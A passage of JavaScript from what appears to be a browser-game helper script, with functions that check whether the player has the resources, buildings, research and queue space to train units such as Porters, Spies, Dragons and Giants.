            for (var p = 0; p < c.length; p++) {
                if (c[p].type === b) {
                    e = true;
                    if (c[p].level < d) {
                        d = c[p].level
                    }
                }
            }
            return (e) ? d : 0
        },
        getCurrentResearchLevel: function (a) {
            var t = Tabs.Jobs,
                level = 0;
            try {
                level = (Seed.player.research[a]) ? Seed.player.research[a] : 0
            } catch (e) {}
            return level
        },
        getUnitCap: function (a, b) {
            var t = Tabs.Jobs;
            var c = 0;
            var d = 0;
            var e = 0;
            c = Data.options.unit_cap.city[0].units[a];
            if (c === 0) {
                return c
            }
            d += (Seed.cities[0].units[a] !== undefined) ? Seed.cities[0].units[a] : 0;
            for (var f in Seed.marches) {
                for (var q in Seed.marches[f].units) {
                    if (q === a) {
                        e += Seed.marches[f].units[q]
                    }
                }
            }
            return ((d + e + b) > c) ? (d + e + b) : 0
        },
        getBuildingCap: function (a, b) {
            return Data.options.building.level_cap[a][b] || 0
        },
        getResearchCap: function (a) {
            var t = Tabs.Jobs;
            var b = 0;
            b = (Data.options.research.level_cap[a]) ? Data.options.research.level_cap[a] : 0;
            return b
        },
        getItem: function (a) {
            var b = Seed.player.items;
            var c = 0;
            for (var p in b) {
                if (p === a) {
                    c = b[p];
                    break
                }
            }
            return c
        },
        getBuildingIndex: function (a, b) {
            var t = Tabs.Jobs,
                bldgIdx = 0;
            var c = (a === 0) ? t.research_capital : t.research_outpost;
            c = (a === 0) ? c.concat(t.research_field) : c.concat(t.research_field);
            for (var i = 0; i < c.length; i++) {
                if (c[i] === b) {
                    bldgIdx = i;
                    break
                }
            }
            return bldgIdx
        },
        getBuildingLevel: function (a, b, c) {
            var d = Seed.cities[a].buildings;
            var e = 0;
            for (var p = 0; p < d.length; p++) {
                if (d[p].type === b && d[p].level >= c) {
                    e = d[p].level;
                    break
                }
            }
            return e
        },
        getResearchIndex: function (a) {
            var t = Tabs.Jobs;
            return t.research_index[a]
        },
        getRemainingQueue: function (a, b) {
            var c = Seed.cities[a];
            var d = c.jobs;
            var e = (c.figures.queue_lengths.units ? c.figures.queue_lengths.units : 0);
            var f = 0;
            if (isNaN(e) || !e) {
                return 0
            }
            for (var i = 0; i < d.length; i++) {
                if (d[i].queue === b) {
                    ++f
                }
            }
            return e - f
        },
        checkPorterReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 40;
            var g = 1;
            var h = a * 1;
            var i = a * 150;
            var j = a * 10;
            var k = a * 2;
            var l = Seed.cities[0];
            var m = "Porter";
            try {
                var o = Seed.requirements.unit[m];
                f = a * o.resources.food;
                g = o.buildings.Garrison;
                h = a * o.population.idle;
                i = a * o.resources.wood;
                j = a * o.resources.ore
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var p = "";
            var n = translate("Required") + ": ";
            var q = {
                trainable: false,
                msg: []
            };
            var r = t.getUnitCap("Porter", a);
            if (r > 0) {
                p += translate("Capacity") + " " + r + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    p += translate("Garrison") + " " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    p += translate("TrainingCamp") + " " + g + " + "
                }
            }
            if (l.resources.food < f) {
                p += translate("Food") + ": " + (f - l.resources.food) + " + "
            }
            if (l.resources.wood < i) {
                p += translate("Wood") + ": " + (i - l.resources.wood) + " + "
            }
            if (l.resources.ore < j) {
                p += translate("Ore") + ": " + (j - l.resources.ore) + " + "
            }
            var s = l.figures.population.current - l.figures.population.laborers - l.figures.population.armed_forces;
            s = (s > 0) ? s : 0;
            if (s < h) {
                p += translate("Peoble") + ": " + (h - s) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                p += translate("training queue") + " "
            }
            if (p.length === 0) {
                q.trainable = true;
                q.msg = a + " " + translate("Porter") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                q.trainable = false;
                q.msg = n + p
            }
            return q
        },
        checkConscriptReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 80;
            var g = 1;
            var h = a * 1;
            var i = a * 100;
            var j = a * 50;
            var k = a * 3;
            var l = Seed.cities[0];
            var m = "Conscript";
            try {
                var o = Seed.requirements.unit[m];
                f = a * o.resources.food;
                g = o.buildings.Garrison;
                h = a * o.population.idle;
                i = a * o.resources.wood;
                j = a * o.resources.ore
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var p = "";
            var n = translate("Required") + ":+ ";
            var q = {
                trainable: false,
                msg: []
            };
            var r = t.getUnitCap("Conscript", a);
            if (r > 0) {
                p += translate("Capacity") + ": " + r + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    p += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    p += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (l.resources.food < f) {
                p += translate("Food") + ": " + (f - l.resources.food) + " + "
            }
            if (l.resources.wood < i) {
                p += translate("Wood") + ": " + (i - l.resources.wood) + " + "
            }
            if (l.resources.ore < j) {
                p += translate("Ore") + ": " + (j - l.resources.ore) + " + "
            }
            var s = l.figures.population.current - l.figures.population.laborers - l.figures.population.armed_forces;
            s = (s > 0) ? s : 0;
            if (s < h) {
                p += translate("People") + ": " + (h - s) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                p += translate("training queue") + " "
            }
            if (p.length === 0) {
                q.trainable = true;
                q.msg = a + " " + translate("Conscript") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                q.trainable = false;
                q.msg = n + p
            }
            return q
        },
        checkSpyReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 120;
            var g = 1;
            var h = a * 1;
            var i = a * 200;
            var j = a * 150;
            var k = a * 5;
            var l = 1;
            var m = Seed.cities[0];
            var o = "Spy";
            try {
                var p = Seed.requirements.unit[o];
                f = a * p.resources.food;
                g = p.buildings.Garrison;
                h = a * p.population.idle;
                i = a * p.resources.wood;
                j = a * p.resources.ore;
                l = p.research.Clairvoyance
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var q = "";
            var n = translate("Required") + ":+ ";
            var r = {
                trainable: false,
                msg: []
            };
            var s = t.getUnitCap("Spy", a);
            if (s > 0) {
                q += translate("Capacity") + ": " + s + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    q += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    q += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (m.resources.food < f) {
                q += translate("Food") + ": " + (f - m.resources.food) + " + "
            }
            if (m.resources.wood < i) {
                q += translate("Wood") + ": " + (i - m.resources.wood) + " + "
            }
            if (m.resources.ore < j) {
                q += translate("Ore") + ": " + (j - m.resources.ore) + " + "
            }
            var u = m.figures.population.current - m.figures.population.laborers - m.figures.population.armed_forces;
            u = (u > 0) ? u : 0;
            if (u < h) {
                q += translate("Peoble") + ": " + (h - u) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                q += translate("Training queue") + " "
            }
            if (Seed.player.research.Clairvoyance < l) {
                q += translate("Clairvoyance") + ": " + l + " + "
            }
            if (q.length === 0) {
                r.trainable = true;
                r.msg = a + " " + translate("Spies") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                r.trainable = false;
                r.msg = n + q
            }
            return r
        },
        checkHalberdsmanReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 150;
            var g = 1;
            var h = a * 1;
            var i = a * 500;
            var j = a * 100;
            var k = a * 6;
            var l = 1;
            var m = Seed.cities[0];
            var o = "Halberdsman";
            try {
                var p = Seed.requirements.unit[o];
                f = a * p.resources.food;
                g = p.buildings.Garrison;
                h = a * p.population.idle;
                i = a * p.resources.wood;
                j = a * p.resources.ore;
                l = p.research.Metallurgy
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var q = "";
            var n = translate("Required") + ":+ ";
            var r = {
                trainable: false,
                msg: []
            };
            var s = t.getUnitCap("Halberdsman", a);
            if (s > 0) {
                q += translate("Capacity") + ": " + s + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    q += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    q += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (m.resources.food < f) {
                q += translate("Food") + ": " + (f - m.resources.food) + " + "
            }
            if (m.resources.wood < i) {
                q += translate("Wood") + ": " + (i - m.resources.wood) + " + "
            }
            if (m.resources.ore < j) {
                q += translate("Ore") + ": " + (j - m.resources.ore) + " + "
            }
            var u = m.figures.population.current - m.figures.population.laborers - m.figures.population.armed_forces;
            u = (u > 0) ? u : 0;
            if (u < h) {
                q += translate("Peoble") + ": " + (h - u) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                q += translate("Training queue") + " "
            }
            if (Seed.player.research.Metallurgy < l) {
                q += translate("Metallurgy") + ": " + l + " + "
            }
            if (q.length === 0) {
                r.trainable = true;
                r.msg = a + " " + translate("Halberdsman") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                r.trainable = false;
                r.msg = n + q
            }
            return r
        },
        checkMinotaurReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 200;
            var g = 3;
            var h = a * 1;
            var i = a * 150;
            var j = a * 400;
            var k = a * 7;
            var l = 1;
            var m = 1;
            var o = Seed.cities[0];
            var p = "Minotaur";
            try {
                var q = Seed.requirements.unit[p];
                f = a * q.resources.food;
                g = q.buildings.Garrison;
                h = a * q.population.idle;
                i = a * q.resources.wood;
                j = a * q.resources.ore;
                l = q.research.Metallurgy;
                m = q.research.Metalsmith
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var r = "";
            var n = translate("Required") + ":+ ";
            var s = {
                trainable: false,
                msg: []
            };
            var u = t.getUnitCap("Minotaur", a);
            if (u > 0) {
                r += translate("Capacity") + ": " + u + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    r += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    r += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (o.resources.food < f) {
                r += translate("Food") + ": " + (f - o.resources.food) + " + "
            }
            if (o.resources.wood < i) {
                r += translate("Wood") + ": " + (i - o.resources.wood) + " + "
            }
            if (o.resources.ore < j) {
                r += translate("Ore") + ": " + (j - o.resources.ore) + " + "
            }
            var v = o.figures.population.current - o.figures.population.laborers - o.figures.population.armed_forces;
            v = (v > 0) ? v : 0;
            if (v < h) {
                r += translate("Peoble") + ": " + (h - v) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                r += translate("Training queue") + " "
            }
            if (Seed.player.research.Metallurgy < l) {
                r += translate("Metallurgy") + ": " + l + " + "
            }
            if (Seed.player.research.Metalsmith < m) {
                r += translate("Metalsmith") + ": " + m + " + "
            }
            if (r.length === 0) {
                s.trainable = true;
                s.msg = a + " " + translate("Minotaur") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                s.trainable = false;
                s.msg = n + r
            }
            return s
        },
        checkLongbowmanReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 300;
            var g = 4;
            var h = a * 2;
            var i = a * 350;
            var j = a * 300;
            var k = a * 9;
            var l = 1;
            var m = Seed.cities[0];
            var o = "Longbowman";
            try {
                var p = Seed.requirements.unit[o];
                f = a * p.resources.food;
                g = p.buildings.Garrison;
                h = a * p.population.idle;
                i = a * p.resources.wood;
                j = a * p.resources.ore;
                l = p.research.Ballistics
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var q = "";
            var n = translate("Required") + ":+ ";
            var r = {
                trainable: false,
                msg: []
            };
            var s = t.getUnitCap("Longbowman", a);
            if (s > 0) {
                q += translate("Capacity") + ": " + s + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    q += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    q += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (m.resources.food < f) {
                q += translate("Food") + ": " + (f - m.resources.food) + " + "
            }
            if (m.resources.wood < i) {
                q += translate("Wood") + ": " + (i - m.resources.wood) + " + "
            }
            if (m.resources.ore < j) {
                q += translate("Ore") + ": " + (j - m.resources.ore) + " + "
            }
            var u = m.figures.population.current - m.figures.population.laborers - m.figures.population.armed_forces;
            u = (u > 0) ? u : 0;
            if (u < h) {
                q += translate("Peoble") + ": " + (h - u) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                q += translate("Training queue") + " "
            }
            if (Seed.player.research.Ballistics < l) {
                q += translate("Ballistics") + ": " + l + " + "
            }
            if (q.length === 0) {
                r.trainable = true;
                r.msg = a + " " + translate("Longbowman") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                r.trainable = false;
                r.msg = n + q
            }
            return r
        },
        checkSwiftStrikeDragonReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 1000;
            var g = 5;
            var h = a * 3;
            var i = a * 600;
            var j = a * 500;
            var k = a * 18;
            var l = 2;
            var m = 1;
            var o = 1;
            var p = Seed.cities[0];
            var q = "SwiftStrikeDragon";
            try {
                var r = Seed.requirements.unit[q];
                f = a * r.resources.food;
                g = r.buildings.Garrison;
                o = r.buildings.Rookery;
                h = a * r.population.idle;
                i = a * r.resources.wood;
                j = a * r.resources.ore;
                m = r.research.RapidDeployment
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var s = "";
            var n = translate("Required") + ":+ ";
            var u = {
                trainable: false,
                msg: []
            };
            var v = t.getUnitCap("SwiftStrikeDragon", a);
            if (v > 0) {
                s += translate("Capacity") + ": " + v + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    s += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    s += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (t.getBuildingLevel(0, "Rookery", o) === 0) {
                s += translate("Rookery") + ": " + o + " + "
            }
            if (p.resources.food < f) {
                s += translate("Food") + ": " + (f - p.resources.food) + " + "
            }
            if (p.resources.wood < i) {
                s += translate("Wood") + ": " + (i - p.resources.wood) + " + "
            }
            if (p.resources.ore < j) {
                s += translate("Ore") + ": " + (j - p.resources.ore) + " + "
            }
            var w = p.figures.population.current - p.figures.population.laborers - p.figures.population.armed_forces;
            w = (w > 0) ? w : 0;
            if (w < h) {
                s += translate("Peoble") + ": " + (h - w) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                s += translate("Training queue") + " "
            }
            if (Seed.player.research.Dragonry < l) {
                s += translate("Dragonry") + ": " + l + " + "
            }
            if (Seed.player.research.RapidDeployment < m) {
                s += translate("RapidDeployment") + ": " + m + " + "
            }
            if (s.length === 0) {
                u.trainable = true;
                u.msg = a + " " + translate("SwiftStrikeDragon") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                u.trainable = false;
                u.msg = n + s
            }
            return u
        },
        checkBattleDragonReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 1000;
            var g = 7;
            var h = a * 6;
            var i = a * 500;
            var j = a * 2500;
            var k = a * 35;
            var l = 3;
            var m = 5;
            var o = 5;
            var p = 5;
            var q = Seed.cities[0];
            var r = "BattleDragon";
            try {
                var s = Seed.requirements.unit[r];
                f = a * s.resources.food;
                g = s.buildings.Garrison;
                o = s.buildings.Rookery;
                p = s.buildings.Metalsmith;
                h = a * s.population.idle;
                i = a * s.resources.wood;
                j = a * s.resources.ore;
                m = s.research.RapidDeployment;
                l = s.research.Dragonry
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var u = "";
            var n = translate("Required") + ":+ ";
            var v = {
                trainable: false,
                msg: []
            };
            var w = t.getUnitCap("BattleDragon", a);
            if (w > 0) {
                u += translate("Capacity") + ": " + w + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    u += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    u += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (t.getBuildingLevel(0, "Metalsmith", p) === 0) {
                u += translate("Metalsmith") + ": " + p + " + "
            }
            if (t.getBuildingLevel(0, "Rookery", o) === 0) {
                u += translate("Rookery") + ": " + o + " + "
            }
            if (q.resources.food < f) {
                u += translate("Food") + ": " + (f - q.resources.food) + " + "
            }
            if (q.resources.wood < i) {
                u += translate("Wood") + ": " + (i - q.resources.wood) + " + "
            }
            if (q.resources.ore < j) {
                u += translate("Ore") + ": " + (j - q.resources.ore) + " + "
            }
            var x = q.figures.population.current - q.figures.population.laborers - q.figures.population.armed_forces;
            x = (x > 0) ? x : 0;
            if (x < h) {
                u += translate("Peoble") + ": " + (h - x) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                u += translate("Training queue") + " "
            }
            if (Seed.player.research.Dragonry < l) {
                u += translate("Dragonry") + ": " + l + " + "
            }
            if (Seed.player.research.RapidDeployment < m) {
                u += translate("RapidDeployment") + ": " + m + " + "
            }
            if (u.length === 0) {
                v.trainable = true;
                v.msg = a + " " + translate("BattleDragon") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                v.trainable = false;
                v.msg = n + u
            }
            return v
        },
        checkArmoredTransportReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 600;
            var g = 6;
            var h = a * 4;
            var i = a * 1500;
            var j = a * 350;
            var k = a * 10;
            var l = 3;
            var m = 3;
            var o = Seed.cities[0];
            var p = "ArmoredTransport";
            try {
                var q = Seed.requirements.unit[p];
                f = a * q.resources.food;
                g = q.buildings.Garrison;
                l = q.buildings.Factory;
                h = a * q.population.idle;
                i = a * q.resources.wood;
                j = a * q.resources.ore;
                m = q.research.Levitation
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var r = "";
            var n = translate("Required") + ":+ ";
            var s = {
                trainable: false,
                msg: []
            };
            var u = t.getUnitCap("ArmoredTransport", a);
            if (u > 0) {
                r += translate("Capacity") + ": " + u + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    r += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    r += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (t.getBuildingLevel(0, "Factory", l) === 0) {
                r += translate("Factory") + ": " + l + " + "
            }
            if (o.resources.food < f) {
                r += translate("Food") + ": " + (f - o.resources.food) + " + "
            }
            if (o.resources.wood < i) {
                r += translate("Wood") + ": " + ((i - o.resources.wood)) + " + "
            }
            if (o.resources.ore < j) {
                r += translate("Ore") + ": " + ((j - o.resources.ore)) + " + "
            }
            var v = o.figures.population.current - o.figures.population.laborers - o.figures.population.armed_forces;
            v = (v > 0) ? v : 0;
            if (v < h) {
                r += translate("Peoble") + ": " + (h - v) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                r += translate("Training queue") + " "
            }
            if (Seed.player.research.Levitation < m) {
                r += translate("Levitation") + ": " + m + " + "
            }
            if (r.length === 0) {
                s.trainable = true;
                s.msg = a + " " + translate("ArmoredTransport") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                s.trainable = false;
                s.msg = n + r
            }
            return s
        },
        checkGiantReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 4000;
            var g = 8;
            var h = a * 8;
            var i = a * 6000;
            var j = a * 1500;
            var k = a * 100;
            var l = 7;
            var m = 7;
            var o = 3;
            var p = 8;
            var q = Seed.cities[0];
            var r = "Giant";
            try {
                var s = Seed.requirements.unit[r];
                f = a * s.resources.food;
                g = s.buildings.Garrison;
                l = s.buildings.Factory;
                m = s.buildings.Metalsmith;
                h = a * s.population.idle;
                i = a * s.resources.wood;
                j = a * s.resources.ore;
                o = s.research.Clairvoyance;
                p = s.research.Metallurgy
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var u = "";
            var n = translate("Required") + ":+ ";
            var v = {
                trainable: false,
                msg: []
            };
            var w = t.getUnitCap("Giant", a);
            if (w > 0) {
                u += translate("Capacity") + ": " + w + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    u += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    u += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (t.getBuildingLevel(0, "Factory", l) === 0) {
                u += translate("Factory") + ": " + l + " + "
            }
            if (t.getBuildingLevel(0, "Metalsmith", m) === 0) {
                u += translate("Metalsmith") + ": " + m + " + "
            }
            if (q.resources.food < f) {
                u += translate("Food") + ": " + (f - q.resources.food) + " + "
            }
            if (q.resources.wood < i) {
                u += translate("Wood") + ": " + (i - q.resources.wood) + " + "
            }
            if (q.resources.ore < j) {
                u += translate("Ore") + ": " + (j - q.resources.ore) + " + "
            }
            var x = q.figures.population.current - q.figures.population.laborers - q.figures.population.armed_forces;
            x = (x > 0) ? x : 0;
            if (x < h) {
                u += translate("Peoble") + ": " + (h - x) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                u += translate("Training queue") + " "
            }
            if (Seed.player.research.Clairvoyance < o) {
                u += translate("Clairvoyance") + ": " + o + " + "
            }
            if (u.length === 0) {
                v.trainable = true;
                v.msg = a + " " + translate("Giant") + " " + translate("UpKeep") + " " + k + " " + translate("Food")
            } else {
                v.trainable = false;
                v.msg = n + u
            }
            return v
        },
        checkFireMirrorReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 5000;
            var g = 10;
            var h = a * 10;
            var i = a * 5000;
            var j = a * 1200;
            var k = a * 8000;
            var l = a * 250;
            var m = 9;
            var o = 10;
            var p = 10;
            var q = Seed.cities[0];
            var r = "FireMirror";
            try {
                var s = Seed.requirements.unit[r];
                f = a * s.resources.food;
                g = s.buildings.Garrison;
                m = s.buildings.Factory;
                h = a * s.population.idle;
                i = a * s.resources.wood;
                j = a * s.resources.ore;
                k = a * s.resources.stone;
                p = s.research.Ballistics;
                o = s.research.Metallurgy
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var u = "";
            var n = translate("Required") + ":+ ";
            var v = {
                trainable: false,
                msg: []
            };
            var w = t.getUnitCap("FireMirror", a);
            if (w > 0) {
                u += translate("Capacity") + ": " + w + " + "
            }
            if (b === 0) {
                if (t.getBuildingLevel(b, "Garrison", g) === 0) {
                    u += translate("Garrison") + ": " + g + " + "
                }
            } else {
                if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                    u += translate("TrainingCamp") + ": " + g + " + "
                }
            }
            if (t.getBuildingLevel(0, "Factory", m) === 0) {
                u += translate("Factory") + ": " + m + " + "
            }
            if (q.resources.food < f) {
                u += translate("Food") + ": " + (f - q.resources.food) + " + "
            }
            if (q.resources.wood < i) {
                u += translate("Wood") + ": " + (i - q.resources.wood) + " + "
            }
            if (q.resources.ore < j) {
                u += translate("Ore") + ": " + (j - q.resources.ore) + " + "
            }
            if (q.resources.stone < k) {
                u += translate("Stone") + ": " + (k - q.resources.stone) + " + "
            }
            var x = q.figures.population.current - q.figures.population.laborers - q.figures.population.armed_forces;
            x = (x > 0) ? x : 0;
            if (x < h) {
                u += translate("Peoble") + ": " + (h - x) + " + "
            }
            if (t.getRemainingQueue(b, "units") === 0) {
                u += translate("Training queue") + " "
            }
            if (Seed.player.research.Metallurgy < o) {
                u += translate("Metallurgy") + ": " + o + " + "
            }
            if (Seed.player.research.Ballistics < p) {
                u += translate("Ballistics") + ": " + p + " + "
            }
            if (u.length === 0) {
                v.trainable = true;
                v.msg = a + " " + translate("FireMirror") + " " + translate("UpKeep") + " " + l + " " + translate("Food")
            } else {
                v.trainable = false;
                v.msg = n + u
            }
            return v
        },
        checkAquaTroopReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 5000;
            var g = 10;
            var h = a * 10;
            var i = a * 5000;
            var j = a * 1200;
            var k = a * 8000;
            var l = a * 250;
            var m = 7;
            var o = 7;
            var p = 8;
            var q = 4;
            var r = Seed.cities[0];
            var s = "AquaTroop";
            try {
                var u = Seed.requirements.unit[s];
                f = a * u.resources.food;
                garrison_level = u.buildings.Garrison;
                m = u.buildings.Factory;
                o = u.buildings.Metalsmith;
                h = a * u.population.idle;
                i = a * u.resources.wood;
                j = a * u.resources.ore;
                k = a * u.resources.stone;
                p = u.research.RapidDeployment;
                q = u.research.Clairvoyance
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var v = "";
            var n = translate("Required") + ":+ ";
            var w = {
                trainable: false,
                msg: []
            };
            var x = t.getUnitCap("AquaTroop", a);
            if (x > 0) {
                v += translate("Capacity") + ": " + x + " + "
            }
            if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                v += translate("TrainingCamp") + ": " + g + " + "
            }
            if (t.getBuildingLevel(0, "Factory", m) === 0) {
                v += translate("Factory") + ": " + m + " + "
            }
            if (t.getBuildingLevel(0, "Metalsmith", o) === 0) {
                v += translate("Metalsmith") + ": " + o + " + "
            }
            var y = t.getItem("AquaTroopRespirator");
            if (y < a) {
                v += translate("Respirators") + ": " + (a - y) + " + "
            }
            if (r.resources.food < f) {
                v += translate("Food") + ": " + (f - r.resources.food) + " + "
            }
            if (r.resources.wood < i) {
                v += translate("Wood") + ": " + (i - r.resources.wood) + " + "
            }
            if (r.resources.ore < j) {
                v += translate("Ore") + ": " + (j - r.resources.ore) + " + "
            }
            if (r.resources.stone < k) {
                v += translate("Stone") + ": " + (k - r.resources.stone) + " + "
            }
            var z = r.figures.population.current - r.figures.population.laborers - r.figures.population.armed_forces;
            z = (z > 0) ? z : 0;
            if (z < h) {
                v += translate("Peoble") + ": " + (h - z) + " + "
            }
            if (t.getRemainingQueue(1, "units") === 0) {
                v += translate("Training queue") + " "
            }
            if (Seed.player.research.Clairvoyance < q) {
                v += translate("Clairvoyance") + ": " + q + " + "
            }
            if (Seed.player.research.RapidDeployment < p) {
                v += translate("RapidDeployment") + ": " + p + " + "
            }
            if (v.length === 0) {
                w.trainable = true;
                w.msg = a + " " + translate("AquaTroop") + " " + translate("UpKeep") + " " + l + " " + translate("Food")
            } else {
                w.trainable = false;
                w.msg = n + v
            }
            return w
        },
        checkStoneTroopReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = a * 3000;
            var g = 10;
            var h = a * 8;
            var i = a * 4000;
            var j = a * 2000;
            var k = a * 8000;
            var l = a * 100;
            var m = 9;
            var o = 9;
            var p = 10;
            var q = 5;
            var r = Seed.cities[0];
            var s = "StoneTroop";
            try {
                var u = Seed.requirements.unit[s];
                f = a * u.resources.food;
                garrison_level = u.buildings.TrainingCamp;
                factory_level = u.buildings.Factory;
                m = u.buildings.Metalsmith;
                h = a * u.population.idle;
                i = a * u.resources.wood;
                j = a * u.resources.ore;
                k = a * u.resources.stone;
                o = u.research.Metallurgy;
                q = u.research.Clairvoyance;
                p = u.research.Masonry
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var v = "";
            var n = translate("Required") + ":+ ";
            var w = {
                trainable: false,
                msg: []
            };
            var x = t.getUnitCap("StoneTroop", a);
            if (x > 0) {
                v += translate("Capacity") + ": " + x + " + "
            }
            if (t.getBuildingLevel(b, "TrainingCamp", g) === 0) {
                v += translate("TrainingCamp") + ": " + g + " + "
            }
            if (t.getBuildingLevel(0, "Metalsmith", m) === 0) {
                v += translate("Metalsmith") + ": " + m + " + "
            }
            var y = t.getItem("StoneTroopItem");
            if (y < a) {
                v += translate("Mandrakes") + ": " + (a - y) + " + "
            }
            if (r.resources.food < f) {
                v += translate("Food") + ": " + (f - r.resources.food) + " + "
            }
            if (r.resources.wood < i) {
                v += translate("Wood") + ": " + (i - r.resources.wood) + " + "
            }
            if (r.resources.ore < j) {
                v += translate("Ore") + ": " + (j - r.resources.ore) + " + "
            }
            if (r.resources.stone < k) {
                v += translate("Stone") + ": " + (k - r.resources.stone) + " + "
            }
            var z = r.figures.population.current - r.figures.population.laborers - r.figures.population.armed_forces;
            z = (z > 0) ? z : 0;
            if (z < h) {
                v += translate("Peoble") + ": " + (h - z) + " + "
            }
            if (t.getRemainingQueue(1, "units") === 0) {
                v += translate("Training queue") + " "
            }
            if (Seed.player.research.Clairvoyance < q) {
                v += translate("Clairvoyance") + ": " + q + " + "
            }
            if (Seed.player.research.Metallurgy < o) {
                v += translate("Metallurgy") + ": " + o + " + "
            }
            if (Seed.player.research.Masonry < p) {
                v += translate("Masonry") + ": " + p + " + "
            }
            if (v.length === 0) {
                w.trainable = true;
                w.msg = a + " " + translate("StoneTroop") + " " + translate("UpKeep") + " " + l + " " + translate("Food")
            } else {
                w.trainable = false;
                w.msg = n + v
            }
            return w
        },
        checkFireTroopReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
